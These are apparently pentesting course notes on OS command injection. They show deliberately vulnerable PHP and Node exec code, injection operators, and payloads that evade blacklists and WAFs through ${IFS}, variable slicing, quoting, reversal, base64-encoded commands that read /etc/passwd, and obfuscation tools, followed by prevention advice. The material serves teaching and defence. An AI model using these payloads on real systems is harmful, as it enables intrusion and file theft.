# COMMAND INJECTION

## INTRO TO COMMAND INJECTIONS

User input goes directly (or indirectly) into a function that executes system commands. OWASP #3 risk — high impact, extremely common. Same root cause as every other injection class: input gets treated as part of the query/code instead of just data, so you can bend the query to do something else entirely.

Injection types by where the input lands:

```
OS Command Injection    → inside an OS command
Code Injection          → inside a code-eval function
SQL Injection           → inside a SQL query
XSS / HTML Injection    → reflected as-is on a page
```

Same idea also covers LDAP, NoSQL, HTTP Header, XPath, IMAP, ORM injection — different query language, same mechanism.

Vulnerable functions by stack:

```
PHP     exec, system, shell_exec, passthru, popen
NodeJS  child_process.exec, child_process.spawn
```

PHP:

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

NodeJS:

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

Identical bug, identical fix, doesn't matter what's running the backend. Not web-only either — any binary or thick client shelling out with unsanitized input breaks the same way.

## DETECTION

For basic/direct command injection, detecting it and exploiting it are the same action — append a command, watch if the output changes. Blind or indirect injection needs fuzzing/code review instead — that's Whitebox Pentesting 101: Command Injection territory, out of scope here.

Host Checker apps (take an IP, ping it, return result) are the textbook case. Output shape tells you the command:

```bash
ping -c 1 <OUR_INPUT>
```

Injection operators:

```
;      %3b        both execute
\n     %0a        both execute
&      %26        both execute (2nd output usually shown first)
|      %7c        only 2nd output shown
&&     %26%26     both, only if 1st succeeds
||     %7c%7c     only 2nd, only if 1st fails
``     %60%60     both, Linux only
$()    %24%28%29  both, Linux only
```

Operator choice doesn't care what's running the backend — PHP/Linux, .NET/Windows, NodeJS/macOS, all the same. One quirk: `;` dies under Windows CMD but works fine in PowerShell.

## INJECTING COMMANDS

```
127.0.0.1; whoami
```

→

```bash
ping -c 1 127.0.0.1; whoami
```

Run it on your own box first, every time, before touching the target.

Get rejected with something like "match the requested format"? Check if that's a real backend check or just JS — open Network tab (`CTRL+SHIFT+E`), resubmit. No new request fired = frontend-only validation, meaning nothing's actually protecting the backend.

Bypass it: intercept in Burp/ZAP, send to Repeater (`CTRL+R`), edit the raw request directly — the frontend JS never runs so its "validation" is theater. URL-encode the payload first (`CTRL+U` on the selection in Burp), then send.

## OTHER INJECTION OPERATORS

AND:

```bash
ping -c 1 127.0.0.1 && whoami
```

OR — only fires if the first command fails, so a valid IP defeats it (ping succeeds, `||` never triggers). Break the first command on purpose instead:

```
|| whoami
```

No IP given → ping throws a usage error → `whoami` runs. Shorter payload, cleaner output.

These operator characters aren't command-injection exclusive — same set recurs across other injection classes:

```
SQL Injection          ' , ; -- /* */
Command Injection      ; &&
LDAP Injection         * ( ) & |
XPath Injection        ' or and not substring concat count
OS Command Injection   ; & |
Code Injection         ' ; -- /* */ $() ${} #{} %{} ^
Path Traversal         ../ ..\ %00
Object Injection       ; & |
XQuery Injection       ' ; -- /* */
Shellcode Injection    \x \u %u %n
Header Injection       \n \r\n \t %0d %0a %09
```

## IDENTIFYING FILTERS

"Invalid input" on a previously-working payload = something's filtering you. Error shown inline, same page → app-level blacklist. Error on a different page entirely, echoing back your IP/request details → probably a WAF.

Basic blacklist pattern:

```php
$blacklist = ['&', '|', ';', ...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

Isolate the trigger by reducing to one character at a time: confirm the bare IP works, add just the operator, see if it breaks. Repeat until you know exactly what's blacklisted.

## BYPASSING SPACE FILTERS

Newline (`%0a`) usually survives the filter — often needed elsewhere in the payload so it doesn't get blacklisted. Use it as your operator.

Space almost always gets blocked, especially on IP-only fields. None of these use a literal space:

```
%09        tab — same effect as space, Linux and Windows both
${IFS}     Linux env var, defaults to space+tab
{ls,-la}   brace expansion — bash auto-inserts the space for you
```

Chain them: `127.0.0.1%0a%09whoami`, `127.0.0.1%0a${IFS}whoami`. More space-bypass tricks on PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

## BYPASSING OTHER BLACKLISTED CHARACTERS

Slash/backslash usually blocked too. No direct env-var substitute like `$IFS` gives you a slash or semicolon outright, but you can slice one out of a variable that already contains it.

Linux — index into `$PATH`:

```bash
echo ${PATH:0:1}
# /
```

Same trick for a semicolon via `$LS_COLORS`:

```bash
echo ${LS_COLORS:10:1}
# ;
```

Don't include `echo` in the real payload — it's only there to preview the char. `printenv` to scan other variables for useful characters.

Windows CMD — slice a system variable the same way:

```cmd
echo %HOMEPATH:~6,-11%
```

PowerShell — string's an array, index it directly:

```powershell
$env:HOMEPATH[0]
```

Character shifting — find the ASCII char one position before the one you need (`man ascii`), shift forward by 1:

```bash
echo $(tr '!-}' '"-~'<<<[)
# \   ([ sits right before \ in ASCII)
```

## BYPASSING BLACKLISTED COMMANDS

Chars clean, still blocked → command blacklist, exact string match against words like `whoami`, `cat`. Beat it by obfuscating the word — output doesn't need to change, just the string.

```php
$blacklist = ['whoami', 'cat', ...];
foreach ($blacklist as $word) {
    if (strpos($_POST['ip'], $word) !== false) {
        echo "Invalid input";
    }
}
```

Quote insertion, works on Linux and Windows both — shell strips quotes mid-word, command still resolves:

```bash
w'h'o'am'i
w"h"o"am"i
```

Don't mix quote types, count has to stay even.

Linux-only, backslash and `$@` — don't need to be paired, one's enough:

```bash
who$@ami
w\ho\am\i
```

Windows-only, caret:

```cmd
who^ami
```

## ADVANCED COMMAND OBFUSCATION

For when you're up against something WAF-grade and the basic bypasses aren't landing.

**Case manipulation** — Windows CMD/PowerShell don't care about case, `WhOaMi` executes fine. Linux bash does care, so force lowercase at execution time:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

or

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

Watch for spaces the obfuscation command itself introduces — swap in `%09`/`${IFS}` or you've just defeated your own bypass.

**Reversed commands** — write it backwards, flip it back inside a subshell at run time:

```bash
echo 'whoami' | rev
# imaohw
$(rev<<<'imaohw')
```

PowerShell:

```powershell
"whoami"[-1..-20] -join ''
# imaohw
iex "$('imaohw'[-1..-20] -join '')"
```

Bypassing a character filter at the same time → reverse those characters into the string too.

**Encoded commands** — best move once char and command filters are both in play, or the server's own decoding is mangling the payload before it lands. Base64 round-trip through a subshell:

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

`<<<` instead of `|` sidesteps a pipe filter. If `bash`/`base64` themselves get flagged, obfuscate those too or swap for `sh` / `openssl` / `xxd`.

Windows — base64 needs UTF-16LE:

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# dwBoAG8AYQBtAGkA
```

same encoding from a Linux box:

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

decode + run:

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

More angles (wildcards, regex, output redirection, integer expansion) on PayloadsAllTheThings. Deeper obfuscation coverage in Secure Coding 101: JavaScript.

## EVASION TOOLS

**Bashfuscator** (Linux): https://github.com/Bashfuscator/Bashfuscator

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
cd ./bashfuscator/bin/
./bashfuscator -c '<COMMAND>'
```

Default run picks a random obfuscator — output can land anywhere from a few hundred chars to over a million. Rein it in:

```bash
./bashfuscator -c '<COMMAND>' -s 1 -t 1 --no-mangling --layers 1
```

Test locally before deploying: `bash -c '<OBFUSCATED_PAYLOAD>'`.

**Invoke-DOSfuscation** (Windows): https://github.com/danielbohannon/Invoke-DOSfuscation

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

Interactive — `SET COMMAND <cmd>`, then pick `ENCODING` or `PAYLOAD` to generate the obfuscated string. No Windows box → run through `pwsh` on Linux, comes preinstalled on Pwnbox.

## COMMAND INJECTION PREVENTION

Avoid system-exec functions wherever a built-in exists — PHP `fsockopen` instead of shelling out to `ping` for a host-alive check, for example. If there's truly no built-in equivalent, never let user input touch the exec function directly, and minimize how often these functions get used at all.

Input validation — PHP built-ins:

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // proceed
} else {
    // deny
}
```

Non-standard format → `preg_match` with a regex. JS/Node equivalent:

```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // proceed
} else {
    // deny
}
```

Node also has format libs on npm (`is-ip`, etc.).

Input sanitization — always runs after validation, never replaces it. Strip anything outside the expected charset instead of blacklisting specific characters:

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

Node/DOMPurify (https://github.com/cure53/DOMPurify):

```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

Free-form fields where you can't restrict the charset (comments, etc.) — PHP `escapeshellcmd`, Node `escape()`. Weaker than real validation; escaping alone is bypassable, same as everything above demonstrates. Deeper code-audit approach in Secure Coding 101: JavaScript.

Server config — `mod_security` or another WAF in front (plus an external one, Cloudflare/Fortinet/Imperva), run the web server under a low-priv account (`www-data`, Principle of Least Privilege), disable dangerous functions outright (PHP: `disable_functions=system,exec,shell_exec,passthru`), cage the app to its own directory (PHP: `open_basedir=/var/www/html`), reject double-encoded requests and non-ASCII in URLs, drop outdated/sensitive libraries (PHP CGI, etc.).